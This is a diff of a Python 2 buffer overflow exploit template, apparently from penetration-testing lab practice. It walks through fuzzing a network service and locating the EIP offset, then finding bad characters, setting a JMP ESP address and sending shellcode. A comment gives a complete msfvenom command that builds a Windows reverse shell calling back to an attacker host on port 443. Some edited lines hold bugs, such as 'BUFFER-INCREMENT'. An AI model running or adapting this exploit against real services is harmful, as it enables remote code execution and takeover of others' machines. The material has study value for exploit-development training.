@@ -9,22 +9,24 @@ import re
 #    the template is based on POP3.
 #    Main function should be set to findBUfferOverFlow
 IP_ADDRESS = '10.11.6.155'
-PORT = 110
+PORT = 5555 
 #Step 1: Tune the buffer creation to trigger a crash by running the script
 #    Main function should be set to findBUfferOverFlow
-BUFFER_START_LENGTH = 2500
-MAX_ITERATION =2 
-BUFFER_INCREMENT =200 
-#Step 2: After you're close, reset the BUFFER_START_LENGTH above and enable the unique string to find the fail point
+BUFFER_START_LENGTH = 1000 
+MAX_ITERATION = 5 
+BUFFER_INCREMENT =30 
+
+#Step 2: After you're close, use a unique string to finde the exact location, set the total buffer length to the last successfulcompletion
 #    Main function should be set to findBUfferOverFlow
+BUFFER_TOTAL_LENGTH = 1060 
 
 #Step 3: Confirm you can control the EIP
 #    Main function should point to find control, set the FIRST_OFFSET
-FIRST_OFFSET = 2606
-BUFFER_TOTAL_LENGTH = FIRST_OFFSET + 400 
+# 61-a  41-A 33-3  61-a   in reverse a3Aa
+# 37-7 61-a 41-A 36-6 in vreverse 6Aa7
+FIRST_OFFSET = 1040
 
-
-#Step 4: Identify any bad charachters
+#Step 4: Identify any bad charachters, look for skips in the memory at the EXP
 #    Main function should point to find_bad_chars
 
 #Step 5: Find a JMP ESP and set the jump address
@@ -47,7 +49,7 @@ BUFFER_TOTAL_LENGTH = FIRST_OFFSET + 400
 #      10.  Update the Jump Address Below, but don't forget to reverse it as little endian for x86
 #      11.  Find the address with JMP ESP in immunity using ->|(black) again and press F2 to put a break point on it.
 
-jump_address = "\x91\xB3\xD1\x76"
+#JUMP_ADDRESS = "\x91\xB3\xD1\x76"
 
 #Step 6: Send Payload
 #       Generate Shell code e.g. msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d" 
@@ -90,32 +92,36 @@ PAYLOAD=(
 # unique pattern generated with /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 500 
 #then truncate it to the buffer increment
 
-#Steps 1,2(enable_unique)
-def find_buffer_overflow(enable_unique):    
+#Step 1
+def id_buffer_overflow():    
     for iteration_count in range (0, MAX_ITERATION):
-        BUFFER_TOTAL_LENGTH = BUFFER_START_LENGTH +iteration_count*BUFFER_INCREMENT
+        BUFFER_TOTAL_LENGTH = BUFFER_START_LENGTH + (iteration_count*BUFFER_INCREMENT)
         print "Fuzzing PASS %s with %s bytes" % (iteration_count, BUFFER_TOTAL_LENGTH)
-        if enable_unique:
-             buffer_string = "A"*(BUFFER_TOTAL_LENGTH - BUFFER_INCREMENT) + get_unique_pattern(BUFFER_INCREMENT)
-        else:
-             buffer_string = "A"*(BUFFER_TOTAL_LENGTH)
+        buffer_string = "A"*(BUFFER_TOTAL_LENGTH)
         interactWithService(IP_ADDRESS, PORT, buffer_string)
-        print "Fuzzing Pass %s completed.-----------------------" % iteration_count
-#Steps 3
-def find_control():
-    jump_address = "BBBB"
-    backfillchar ="C"
+        print "Fuzzing Pass %s completed (%d Bytes).-----------------------" % iteration_count, BUFFER_TOTAL_LENGTH
+#Step 2
+def find_overflow_point():
+    buffer_string = "A"*(BUFFER_TOTAL_LENGTH - BUFFER_INCREMENT) + get_unique_pattern(BUFFER_INCREMENT)
+    print "Sending total length %d, unique length %d starts at %d" % (BUFFER_TOTAL_LENGTH, BUFFER_INCREMENT,(BUFFER_TOTAL_LENGTH-BUFFER-INCREMENT))
+    interactWithService(IP_ADDRESS, PORT, buffer_string)
+
+
+#Step 3
+def prove_control():
     #Note, FIRST_OFFSET is set at the top of this script once discovered with find_buffer_overflow
-    buffer_string = "A"*FIRST_OFFSET + jump_address + backfillchar*(BUFFER_TOTAL_LENGTH - FIRST_OFFSET - len(jump_address) )
+    print "attempting to write to EIP with offset %d" % FIRST_OFFSET
+    buffer_string = "A"*FIRST_OFFSET + "BBBB" + "C"*(BUFFER_TOTAL_LENGTH - FIRST_OFFSET - 4) 
+    print "first offset %d, total length %d" % (FIRST_OFFSET, len(buffer_string))
     interactWithService(IP_ADDRESS, PORT, buffer_string)
     print "FindControl Buffer Sent----------------------------"
 
-#Steps 4
+#Step 4
 def find_bad_chars():
     badchars = get_all_chars()  
     badchars = re.sub(r'\x00', "", badchars)
-    badchars = re.sub(r'\x0a', "", badchars)
-    badchars = re.sub(r'\x0d', "", badchars)
+    #badchars = re.sub(r'\x0a', "", badchars)
+    #badchars = re.sub(r'\x0d', "", badchars)
   
     #repeat for other bad characters.
     buffer_string= "A"*FIRST_OFFSET + "B"*4 + badchars
@@ -126,17 +132,17 @@ def find_bad_chars():
 #Step 5
 def take_control():
     backfillchar ="C"
-    buffer_string = "A"*FIRST_OFFSET + jump_address + backfillchar*(BUFFER_TOTAL_LENGTH - FIRST_OFFSET - len(jump_address) )
+    buffer_string = "A"*FIRST_OFFSET + JUMP_ADDRESS + backfillchar*(BUFFER_TOTAL_LENGTH - FIRST_OFFSET - len(JUMP_ADDRESS) )
     interactWithService(IP_ADDRESS, PORT, buffer_string)
     print "take_control completed.------------------------------"
 
 #Step 6
 def send_payload():
     backfill_char ="C"
-    backfill_count = (BUFFER_TOTAL_LENGTH - FIRST_OFFSET - len(jump_address) - NOP_COUNT -len(PAYLOAD))
+    backfill_count = (BUFFER_TOTAL_LENGTH - FIRST_OFFSET - len(JUMP_ADDRESS) - NOP_COUNT -len(PAYLOAD))
     if backfill_count <1:
         print "need more buffer"
-    buffer_string = "A"*FIRST_OFFSET + jump_address + NOP*NOP_COUNT + PAYLOAD +backfill_char*backfill_count
+    buffer_string = "A"*FIRST_OFFSET + JUMP_ADDRESS + NOP*NOP_COUNT + PAYLOAD +backfill_char*backfill_count
     interactWithService(IP_ADDRESS, PORT, buffer_string)
     print "payload sent.------------------------"
 
@@ -144,12 +150,12 @@ def interactWithService(IP_ADDRESS, PORT, buffer_string):
     try:  
       s1=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       connect=s1.connect((IP_ADDRESS,PORT))
-      s1.recv(1024)
-      s1.send('USER test\r\n')
-      s1.recv(1024)
-      #print "%s %s" % (len(buffer_string),buffer_string)
-      s1.send('PASS ' + buffer_string + '\r\n')
-      s1.send('QUIT\r\n')
+      response = s1.recv(1024)
+      print "Response1: %s" % response
+      s1.send('AUTH '+ buffer_string + '\r\n')
+      response = s1.recv(1024)
+      print "Response2: %s" %response
+      s1.send('exit\r\n')
       s1.close()
     except:
       print "POP3 Connection Failure"
@@ -234,9 +240,6 @@ def get_all_chars():
 
 
 if __name__ == "__main__":
-    #find_buffer_overflow()
-    #find_control()
-    #find_bad_chars()
     prompt = "Choose your poison:"
     prompt += "\n\t 1. Find Buffer Overflow Existence"
     prompt += "\n\t 2. Find Buffer Overflow Location (unique string)"
@@ -249,11 +252,11 @@ if __name__ == "__main__":
     user_choice = input(prompt)
     print "\n\n"
     if user_choice == 1:
-        find_buffer_overflow(enable_unique=0)
+        id_buffer_overflow()
     elif user_choice == 2:    
-        find_buffer_overflow(enable_unique=1)
+        find_overflow_point()
     elif user_choice == 3:
-        find_control()
+        prove_control()
     elif user_choice == 4:
         find_bad_chars()
     elif user_choice == 5:
